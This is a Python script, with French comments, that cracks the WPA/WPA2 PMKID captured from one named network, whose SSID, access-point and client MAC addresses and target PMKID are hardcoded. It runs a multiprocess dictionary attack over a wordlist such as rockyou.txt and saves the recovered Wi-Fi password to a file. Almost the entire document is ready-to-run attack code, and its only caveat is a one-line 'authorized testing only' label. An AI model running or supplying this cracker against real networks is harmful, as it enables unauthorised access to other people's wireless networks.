#!/usr/bin/env python3
"""
crack_pmkid_threaded.py
Usage (authorized testing only):
  python3 crack_pmkid_threaded.py --workers 4 --wordlist rockyou.txt
"""
import argparse
import hashlib
import hmac
from binascii import unhexlify
from multiprocessing import Process, Event, Value, cpu_count
import sys
import os
import time

ITER = 4096
PMK_LEN = 32

# ========== PARAMÈTRES (modifie si besoin) ==========
SSID = "Rao likes 1X Movies"
AP_MAC = "000b867e2169"      # AA (BSSID) en hex sans ':'
CLIENT_MAC = "100ba96b6198"  # SPA (client) en hex sans ':'
TARGET_PMKID = "6b4422576017bf09fc42a56d26a43c48"

def pbkdf2_sha1(password: str, ssid: str) -> bytes:
    return hashlib.pbkdf2_hmac('sha1', password.encode('utf-8'), ssid.encode('utf-8'), ITER, PMK_LEN)

def calculate_pmkid(password: str) -> str:
    pmk = pbkdf2_sha1(password, SSID)
    pmk_name = b"PMK Name"
    aa = unhexlify(AP_MAC)
    spa = unhexlify(CLIENT_MAC)
    data = pmk_name + aa + spa
    digest = hmac.new(pmk, data, hashlib.sha1).digest()[:16]
    return digest.hex()

def worker(worker_id: int, workers: int, wordlist_path: str, stop_event: Event, counter: Value):
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for idx, line in enumerate(f):
                if stop_event.is_set():
                    return
                # distribution round-robin
                if (idx % workers) != worker_id:
                    continue
                pw = line.rstrip('\n\r')
                if not pw or pw.startswith('#'):
                    continue
                try:
                    pmkid = calculate_pmkid(pw)
                except Exception:
                    # skip problematic encodings
                    with counter.get_lock():
                        counter.value += 1
                    continue
                with counter.get_lock():
                    counter.value += 1
                if pmkid == TARGET_PMKID:
                    print(f"\nWorker {worker_id}: PASSWORD TROUVÉ -> {pw}")
                    with open("password_found.txt", "w", encoding='utf-8') as out:
                        out.write(f"SSID: {SSID}\n")
                        out.write(f"Password: {pw}\n")
                        out.write(f"AP_MAC: {AP_MAC}\n")
                        out.write(f"CLIENT_MAC: {CLIENT_MAC}\n")
                        out.write(f"PMKID: {TARGET_PMKID}\n")
                    stop_event.set()
                    return
    except FileNotFoundError:
        if worker_id == 0:
            print(f"Fichier wordlist introuvable: {wordlist_path}")
            stop_event.set()
        return
    except Exception as e:
        if not stop_event.is_set():
            print(f"Worker {worker_id} erreur: {e}", file=sys.stderr)
            stop_event.set()
        return

def main():
    parser = argparse.ArgumentParser(description="PMKID crack (multiprocess) — authorized testing only.")
    parser.add_argument("--workers", "-j", type=int, default=max(1, cpu_count()-1))
    parser.add_argument("--wordlist", "-w", default="rockyou.txt")
    parser.add_argument("--interval", "-i", type=int, default=5, help="Affichage du compteur (secondes)")
    args = parser.parse_args()

    workers = max(1, args.workers)
    wordlist = args.wordlist
    interval = max(1, args.interval)

    print("=== PMKID cracking (multiprocess) ===")
    print(f"SSID: {SSID}")
    print(f"AP MAC: {AP_MAC}  CLIENT MAC: {CLIENT_MAC}")
    print(f"Target PMKID: {TARGET_PMKID}")
    print(f"Wordlist: {os.path.abspath(wordlist)}")
    print(f"Workers: {workers}")
    print("-------------------------------------")

    stop_event = Event()
    counter = Value('L', 0)  # unsigned long, atomic via get_lock()

    procs = []
    try:
        for i in range(workers):
            p = Process(target=worker, args=(i, workers, wordlist, stop_event, counter), daemon=True)
            p.start()
            procs.append(p)

        # monitor loop: affiche le compteur toutes les 'interval' secondes
        last_print = time.time()
        while True:
            if stop_event.is_set():
                break
            alive = any(p.is_alive() for p in procs)
            now = time.time()
            if now - last_print >= interval:
                with counter.get_lock():
                    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Total tried: {counter.value}", flush=True)
                last_print = now
            if not alive:
                break
            time.sleep(0.2)

        # join children
        for p in procs:
            p.join(timeout=1)

    except KeyboardInterrupt:
        print("\nInterrompu par l'utilisateur. Arrêt des workers...")
        stop_event.set()
        for p in procs:
            p.terminate()
            p.join()
    finally:
        with counter.get_lock():
            total = counter.value
        if stop_event.is_set() and os.path.exists("password_found.txt"):
            print(f"\nTerminé: mot de passe trouvé. Total essais: {total}. Voir password_found.txt")
        else:
            print(f"\nTerminé: mot de passe non trouvé. Total essais: {total}. Essayez une wordlist plus grosse ou hashcat GPU.")

if __name__ == "__main__":
    main()
